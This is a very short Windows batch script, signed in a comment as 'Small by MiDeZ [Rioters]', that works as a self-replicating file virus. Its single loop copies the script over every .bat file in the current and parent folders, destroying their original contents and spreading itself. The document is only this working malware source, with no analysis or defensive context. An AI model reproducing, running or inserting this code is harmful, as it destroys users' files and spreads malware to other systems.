:Small by MiDeZ [Rioters]
@echo off
for %%m in (*.bat ..\*.bat) do copy %0.bat+%0 %%m>nul
